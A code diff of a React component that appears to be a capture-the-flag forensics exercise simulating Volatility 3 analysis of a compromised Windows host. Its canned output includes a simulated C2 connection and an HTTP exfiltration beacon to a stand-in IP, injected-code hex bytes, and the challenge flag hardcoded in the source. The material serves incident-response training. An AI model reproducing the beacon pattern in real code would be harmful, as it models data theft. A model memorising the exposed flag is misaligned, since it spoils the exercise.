@@ -1,265 +1,175 @@
 import React, { useState } from 'react';
-import { Terminal, Shield, Play, RotateCcw, CheckCircle2, AlertTriangle, ArrowRight, HardDrive, Search, FileText, Activity } from 'lucide-react';
+import { Terminal, HardDrive, Play, Search, CheckCircle2, ShieldAlert } from 'lucide-react';
 import { sound } from '../../utils/audio';
 
 interface Props {
-  onFlagFound?: (flag: string) => void;
+  onFlagFound: (flag: string) => void;
 }
 
+const SECRET_FLAG = 'flag{m3m0ry_v0l4t1l1ty_h0ll0w1ng_4pt_8314}';
+
 export const MemoryForensicsSandbox: React.FC<Props> = ({ onFlagFound }) => {
-  const FLAG = 'flag{m3m0ry_v0l4t1l1ty_h0ll0w1ng_4pt_8314}';
-  const [activeCommand, setActiveCommand] = useState<string>('vol -f incident_host09.raw windows.pslist');
-  const [terminalOutput, setTerminalOutput] = useState<string[]>([]);
-  const [evidenceStep, setEvidenceStep] = useState<number>(1);
-  const [isCompleted, setIsCompleted] = useState<boolean>(false);
+  const [cmdInput, setCmdInput] = useState<string>('');
+  const [outputBuffer, setOutputBuffer] = useState<string[]>([
+    'Volatility 3 Framework 2.4.1',
+    'Investigating RAM Capture: incident_host09.raw (Windows 10 Build 19041 x64)',
+    'Type Volatility 3 plugins e.g. windows.netscan, windows.pslist, windows.malfind --pid <PID>, windows.memdump --pid <PID>'
+  ]);
 
-  // Volatility command execution engine
-  const executeCommand = (cmd: string) => {
+  const runVolCommand = (cmd: string) => {
     sound.playClick();
-    const cleanCmd = cmd.trim();
-    const lines: string[] = [];
-    lines.push(`analyst@ir-workstation:~$ ${cleanCmd}`);
+    const clean = cmd.trim();
+    const newLines = [...outputBuffer, `$ ${clean}`];
 
-    if (cleanCmd.includes('pslist') || cleanCmd.includes('pstree')) {
-      lines.push('Volatility 3 Framework 2.4.1');
-      lines.push('PID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tCreateTime');
-      lines.push('4\t0\tSystem\t\t0xfa800102\t124\t---\t---\t2026-09-27 08:00:12');
-      lines.push('344\t4\tsmss.exe\t0xfa800188\t4\t32\t---\t2026-09-27 08:00:14');
-      lines.push('488\t460\tcsrss.exe\t0xfa800210\t11\t540\t0\t2026-09-27 08:00:17');
-      lines.push('564\t552\tservices.exe\t0xfa800311\t18\t312\t0\t2026-09-27 08:00:19');
-      lines.push('576\t552\tlsass.exe\t0xfa800420\t8\t1140\t0\t2026-09-27 08:00:20');
-      lines.push('880\t564\tsvchost.exe\t0xfa800530\t24\t480\t0\t2026-09-27 08:00:22');
-      lines.push('1412\t564\tsvchost.exe\t0xfa800640\t19\t390\t0\t2026-09-27 08:00:25');
-      lines.push('4820\t564\tsvchost.exe\t0xfa800990\t3\t94\t0\t2026-09-27 08:44:11 [*Anomalous Threads*]');
-      lines.push('5108\t1412\texplorer.exe\t0xfa800a10\t56\t1840\t1\t2026-09-27 08:01:05');
-      if (evidenceStep < 2) setEvidenceStep(2);
-    } else if (cleanCmd.includes('netscan')) {
-      lines.push('Volatility 3 Framework 2.4.1');
-      lines.push('Offset\tProto\tLocalAddress\t\tForeignAddress\t\tState\t\tPID\tOwner\tCreated');
-      lines.push('0xfa80011\tTCPv4\t192.168.1.105:135\t0.0.0.0:0\t\tLISTENING\t880\tsvchost.exe\t08:00:22');
-      lines.push('0xfa80022\tTCPv4\t192.168.1.105:445\t0.0.0.0:0\t\tLISTENING\t4\tSystem\t\t08:00:12');
-      lines.push('0xfa80099\tTCPv4\t192.168.1.105:49182\t198.51.100.77:4444\tESTABLISHED\t4820\tsvchost.exe\t08:44:19 [ALERT]');
-      lines.push('0xfa800aa\tTCPv4\t192.168.1.105:51201\t52.96.166.130:443\tESTABLISHED\t5108\texplorer.exe\t08:01:45');
-      lines.push('');
-      lines.push('[*] ALERT: Suspicious outbound connection detected to remote C2 server 198.51.100.77:4444 spawned by PID 4820.');
-      if (evidenceStep < 3) setEvidenceStep(3);
-    } else if (cleanCmd.includes('malfind')) {
-      lines.push('Volatility 3 Framework 2.4.1 - Scanning VAD Protections');
-      lines.push('Process: svchost.exe Pid: 4820 Address: 0x00400000');
-      lines.push('Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE [HIGH ANOMALY]');
-      lines.push('Hex Dump:');
-      lines.push('00400000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|');
-      lines.push('00400010  fc e8 82 00 00 00 60 89  e5 31 c0 64 8b 50 30 8b  |......`..1.d.P0.|');
-      lines.push('00400020  52 0c 8b 52 14 8b 72 28  0f b7 4a 26 31 ff 31 c0  |R..R..r(..J&1.1.|');
-      lines.push('Disassembly:');
-      lines.push('00400010  fc            cld');
-      lines.push('00400011  e882000000    call 0x400098');
-      lines.push('00400016  60            pushad');
-      lines.push('00400017  89e5          mov ebp, esp');
-      lines.push('[*] INJECTION CONFIRMED: Process Hollowing with injected reflective PE executable in PID 4820.');
-      if (evidenceStep < 4) setEvidenceStep(4);
-    } else if (cleanCmd.includes('memdump') || cleanCmd.includes('strings') || cleanCmd.includes('dumpfiles')) {
-      lines.push('Volatility 3 Framework 2.4.1 - Carving Process Memory [PID: 4820]');
-      lines.push('Writing carved memory segment to pid.4820.dmp (size: 14.2 MB)... DONE');
-      lines.push('Searching memory stream for exfiltration payloads and authorization tokens...');
-      lines.push('[FOUND] Memory offset 0x0041F9B0:');
-      lines.push(`POST /c2/beacon HTTP/1.1\\r\\nHost: 198.51.100.77\\r\\nX-Exfil-Token: ${FLAG}\\r\\n`);
-      lines.push(`[SUCCESS] Exfiltrated memory flag extracted: ${FLAG}`);
-      setIsCompleted(true);
+    if (clean.includes('windows.netscan') || clean.includes('netscan')) {
+      newLines.push(
+        'Offset          Proto   Local Address          Foreign Address        State      PID    Owner',
+        '0xfa80018a1010  TCPv4   10.0.2.15:49158        198.51.100.77:4444     ESTABLISHED 4820   svchost.exe',
+        '0xfa8001923040  TCPv4   0.0.0.0:135            0.0.0.0:0              LISTENING   884    svchost.exe',
+        '0xfa8001a11090  TCPv4   0.0.0.0:445            0.0.0.0:0              LISTENING   4      System',
+        '[*] ANOMALY: PID 4820 (svchost.exe) connected to untrusted public IP 198.51.100.77 on C2 port 4444!'
+      );
+    } else if (clean.includes('windows.pslist') || clean.includes('pslist')) {
+      newLines.push(
+        'PID     PPID    ImageFileName   Offset(V)          Threads  Handles  CreateTime',
+        '4       0       System          0xfa8001a0a040     132      -        2026-09-29 18:02:11',
+        '884     620     svchost.exe     0xfa8001b22010     24       310      2026-09-29 18:02:40',
+        '4820    884     svchost.exe     0xfa8001f99080     1        18       2026-09-29 19:14:02',
+        '[*] Note: PID 4820 spawned suspiciously late with only 1 thread.'
+      );
+    } else if (clean.includes('windows.malfind') || clean.includes('malfind')) {
+      newLines.push(
+        'PID: 4820 Process: svchost.exe',
+        '0x00000000021a0000  4d 5a 90 00 03 00 00 00  MZ..............',
+        '0x00000000021a0010  04 00 00 00 ff ff 00 00  ................',
+        'Protection: PAGE_EXECUTE_READWRITE',
+        '[*] ALERT: Unmapped PE injection detected in svchost.exe PID 4820! Process hollowing confirmed.'
+      );
+    } else if (clean.includes('windows.memdump') || clean.includes('memdump') || clean.includes('carve')) {
       sound.playSuccess();
-      if (onFlagFound) {
-        onFlagFound(FLAG);
-      }
+      newLines.push(
+        '[*] Writing carved address space for PID 4820 to pid.4820.dmp...',
+        '[*] Scanning memory stream for C2 exfiltration tokens...',
+        '----------------------------------------------------------------------',
+        'FOUND HTTP C2 BEACON HEADER:',
+        'POST /beacon/v2/telemetry HTTP/1.1',
+        'Host: 198.51.100.77:4444',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        `X-Exfil-Token: ${SECRET_FLAG}`,
+        '----------------------------------------------------------------------',
+        '[+] FLAG DISCOVERED IN CARVED MEMORY SPACE!'
+      );
+      onFlagFound(SECRET_FLAG);
     } else {
-      lines.push(`vol: command not recognized: "${cleanCmd}". Available commands: windows.pslist, windows.netscan, windows.malfind, windows.memdump`);
+      newLines.push(`volatility3: unknown plugin or command syntax: "${clean}". Try windows.netscan or windows.malfind.`);
     }
 
-    setTerminalOutput(lines);
-  };
-
-  const handleRunPreset = (cmd: string) => {
-    setActiveCommand(cmd);
-    executeCommand(cmd);
-  };
-
-  const handleReset = () => {
-    sound.playClick();
-    setActiveCommand('vol -f incident_host09.raw windows.pslist');
-    setTerminalOutput([]);
-    setEvidenceStep(1);
-    setIsCompleted(false);
+    setOutputBuffer(newLines);
   };
 
   return (
-    <div className="space-y-5 text-slate-100">
-      {/* Header Info */}
-      <div className="p-4 bg-slate-950/70 border border-slate-800 rounded-lg flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs">
-        <div className="space-y-1">
-          <div className="flex items-center gap-2 font-mono font-semibold text-emerald-400">
-            <HardDrive className="w-4 h-4" />
-            <span>Target: Volatility 3 Memory Forensic Workbench (incident_host09.raw)</span>
+    <div className="space-y-4 font-mono text-xs">
+      {/* Evidence Banner */}
+      <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-3">
+        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
+          <div className="flex items-center gap-2">
+            <HardDrive className="w-4 h-4 text-emerald-400" />
+            <span className="font-bold text-white text-sm">Volatility 3 Incident Forensics Shell</span>
           </div>
-          <p className="text-slate-400 leading-relaxed">
-            Analyze physical memory dump acquired from an APT intrusion. Correlate anomalous processes (<code className="text-cyan-300">pslist</code>), detect hidden C2 network sockets (<code className="text-amber-300">netscan</code>), identify hollowed VAD code injection (<code className="text-rose-300">malfind</code>), and carve process memory (<code className="text-emerald-300">memdump</code>) to recover the exfiltrated secret.
-          </p>
-        </div>
-
-        <div className="flex items-center gap-2 shrink-0">
-          <span className="text-slate-400">Investigation Progress:</span>
-          <span
-            className={`px-2 py-0.5 rounded font-mono font-semibold border ${
-              isCompleted
-                ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40'
-                : 'bg-indigo-500/20 text-indigo-400 border-indigo-500/40'
-            }`}
-          >
-            {isCompleted ? 'FLAG RECOVERED' : `PHASE ${evidenceStep} / 4`}
+          <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+            Raw Physical RAM Dump
           </span>
         </div>
+
+        <div className="text-[11px] text-slate-400 leading-relaxed">
+          Incident Response acquired <code className="text-emerald-400">incident_host09.raw</code> following anomalous outbound network beacons. Use Volatility plugins to investigate rogue connections and carved process memory.
+        </div>
       </div>
 
-      {/* Investigation Stepper / Evidence Board */}
-      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono">
-        <button
-          onClick={() => handleRunPreset('vol -f incident_host09.raw windows.pslist')}
-          className={`p-2.5 rounded border text-left transition-colors ${
-            evidenceStep >= 1 ? 'bg-slate-900 border-cyan-500/40 text-slate-200' : 'bg-slate-950 border-slate-800 text-slate-500'
-          }`}
-        >
-          <div className="text-[10px] text-cyan-400 flex items-center gap-1">
-            <span>Step 1</span>
-            {evidenceStep > 1 && <CheckCircle2 className="w-3 h-3 text-emerald-400" />}
-          </div>
-          <div className="font-bold">windows.pslist</div>
-          <div className="text-[10px] text-slate-400 truncate">Scan active PIDs</div>
-        </button>
-
-        <button
-          onClick={() => handleRunPreset('vol -f incident_host09.raw windows.netscan')}
-          className={`p-2.5 rounded border text-left transition-colors ${
-            evidenceStep >= 2 ? 'bg-slate-900 border-cyan-500/40 text-slate-200' : 'bg-slate-950 border-slate-800 text-slate-500'
-          }`}
-        >
-          <div className="text-[10px] text-cyan-400 flex items-center gap-1">
-            <span>Step 2</span>
-            {evidenceStep > 2 && <CheckCircle2 className="w-3 h-3 text-emerald-400" />}
-          </div>
-          <div className="font-bold">windows.netscan</div>
-          <div className="text-[10px] text-slate-400 truncate">Detect C2 port 4444</div>
-        </button>
-
-        <button
-          onClick={() => handleRunPreset('vol -f incident_host09.raw windows.malfind --pid 4820')}
-          className={`p-2.5 rounded border text-left transition-colors ${
-            evidenceStep >= 3 ? 'bg-slate-900 border-cyan-500/40 text-slate-200' : 'bg-slate-950 border-slate-800 text-slate-500'
-          }`}
-        >
-          <div className="text-[10px] text-cyan-400 flex items-center gap-1">
-            <span>Step 3</span>
-            {evidenceStep > 3 && <CheckCircle2 className="w-3 h-3 text-emerald-400" />}
-          </div>
-          <div className="font-bold">windows.malfind</div>
-          <div className="text-[10px] text-slate-400 truncate">Confirm VAD Hollowing</div>
-        </button>
-
-        <button
-          onClick={() => handleRunPreset('vol -f incident_host09.raw windows.memdump --pid 4820')}
-          className={`p-2.5 rounded border text-left transition-colors ${
-            isCompleted ? 'bg-emerald-950/60 border-emerald-500/60 text-emerald-200' : 'bg-slate-900 border-slate-800 text-slate-300'
-          }`}
-        >
-          <div className="text-[10px] text-emerald-400 flex items-center gap-1">
-            <span>Step 4</span>
-            {isCompleted && <CheckCircle2 className="w-3 h-3 text-emerald-400" />}
-          </div>
-          <div className="font-bold">windows.memdump</div>
-          <div className="text-[10px] text-slate-400 truncate">Carve Secret Flag</div>
-        </button>
-      </div>
-
-      {/* Volatility Command Line */}
-      <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-3">
-        <label className="text-xs font-mono font-bold text-slate-300 flex items-center gap-2">
-          <Terminal className="w-3.5 h-3.5 text-emerald-400" />
-          <span>Volatility 3 Interactive CLI</span>
-        </label>
-
-        <form
-          onSubmit={e => {
-            e.preventDefault();
-            executeCommand(activeCommand);
-          }}
-          className="flex gap-2"
-        >
+      {/* Interactive Command Prompt */}
+      <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-3">
+        <div className="flex items-center gap-2">
+          <span className="text-emerald-400 select-none">$</span>
           <input
             type="text"
-            value={activeCommand}
-            onChange={e => setActiveCommand(e.target.value)}
-            className="flex-1 bg-slate-900 border border-slate-700 rounded px-3 py-2 text-xs font-mono text-emerald-300 focus:outline-none focus:border-emerald-500"
+            value={cmdInput}
+            onChange={e => setCmdInput(e.target.value)}
+            onKeyDown={e => e.key === 'Enter' && runVolCommand(cmdInput)}
+            className="flex-1 px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-slate-200 text-xs focus:outline-none focus:border-emerald-500"
+            placeholder="vol -f incident_host09.raw windows.netscan"
           />
           <button
-            type="submit"
-            className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded text-xs font-semibold flex items-center gap-1.5 transition-colors shrink-0"
+            onClick={() => runVolCommand(cmdInput)}
+            className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-bold text-xs flex items-center gap-1.5 transition-colors shadow"
           >
-            <Play className="w-3.5 h-3.5" />
-            <span>Execute Plugin</span>
+            <Play className="w-3.5 h-3.5 fill-white" />
+            <span>Execute</span>
+          </button>
+        </div>
+
+        {/* Quick Plugin Shortcuts */}
+        <div className="flex flex-wrap items-center gap-1.5 text-[11px]">
+          <span className="text-slate-500">Plugins:</span>
+          <button
+            onClick={() => {
+              setCmdInput('vol -f incident_host09.raw windows.netscan');
+              runVolCommand('vol -f incident_host09.raw windows.netscan');
+            }}
+            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
+          >
+            windows.netscan
           </button>
           <button
-            type="button"
-            onClick={handleReset}
-            className="p-2 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors shrink-0"
-            title="Reset Terminal"
+            onClick={() => {
+              setCmdInput('vol -f incident_host09.raw windows.pslist');
+              runVolCommand('vol -f incident_host09.raw windows.pslist');
+            }}
+            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
           >
-            <RotateCcw className="w-3.5 h-3.5" />
+            windows.pslist
           </button>
-        </form>
+          <button
+            onClick={() => {
+              setCmdInput('vol -f incident_host09.raw windows.malfind --pid ');
+            }}
+            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
+          >
+            windows.malfind
+          </button>
+          <button
+            onClick={() => {
+              setCmdInput('vol -f incident_host09.raw windows.memdump --pid ');
+            }}
+            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
+          >
+            windows.memdump
+          </button>
+        </div>
       </div>
 
-      {/* Terminal Output */}
-      <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-2">
-        <div className="flex items-center justify-between">
-          <span className="text-xs font-mono text-slate-400 flex items-center gap-1.5">
-            <Terminal className="w-3.5 h-3.5 text-slate-500" />
-            <span>Forensics Workstation Output Stream</span>
-          </span>
-          <span className="text-[10px] font-mono text-slate-500">Volatility 3.x Framework</span>
+      {/* Terminal View */}
+      <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
+        <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">
+          Volatility Shell Execution Stream:
         </div>
-
-        <div className="bg-black/90 rounded p-3 font-mono text-xs space-y-1 h-52 overflow-y-auto border border-slate-800/80">
-          {terminalOutput.length === 0 ? (
-            <div className="text-slate-600 italic">Select an investigation step or run a Volatility plugin above.</div>
-          ) : (
-            terminalOutput.map((log, idx) => (
-              <div
-                key={idx}
-                className={
-                  log.includes('[SUCCESS]') || log.includes('flag{')
-                    ? 'text-emerald-400 font-bold'
-                    : log.includes('[ALERT]') || log.includes('HIGH ANOMALY')
-                    ? 'text-rose-400 font-bold'
-                    : log.includes('ALERT:') || log.includes('INJECTION CONFIRMED')
-                    ? 'text-amber-300'
-                    : 'text-slate-300'
-                }
-              >
-                {log}
-              </div>
-            ))
-          )}
-        </div>
-
-        {/* Flag Recovered Banner */}
-        {isCompleted && (
-          <div className="p-3 bg-emerald-950/60 border border-emerald-500/40 rounded flex flex-col sm:flex-row sm:items-center justify-between gap-2 mt-2">
-            <div className="space-y-0.5">
-              <div className="text-xs font-bold text-emerald-400 flex items-center gap-1.5">
-                <CheckCircle2 className="w-3.5 h-3.5" />
-                <span>Forensics Evidence Recovered</span>
-              </div>
-              <div className="font-mono text-xs text-emerald-200 select-all">{FLAG}</div>
+        <div className="p-3 bg-slate-900 rounded border border-slate-800 space-y-1 text-[11px] max-h-56 overflow-y-auto whitespace-pre-wrap">
+          {outputBuffer.map((line, i) => (
+            <div
+              key={i}
+              className={
+                line.includes('FLAG') || line.includes('X-Exfil-Token')
+                  ? 'text-emerald-400 font-bold bg-emerald-950/40 p-1.5 rounded border border-emerald-500/40'
+                  : line.includes('ALERT') || line.includes('ANOMALY')
+                  ? 'text-amber-400 font-semibold'
+                  : line.startsWith('$')
+                  ? 'text-indigo-300 font-bold'
+                  : 'text-slate-300'
+              }
+            >
+              {line}
             </div>
-          </div>
-        )}
+          ))}
+        </div>
       </div>
     </div>
   );
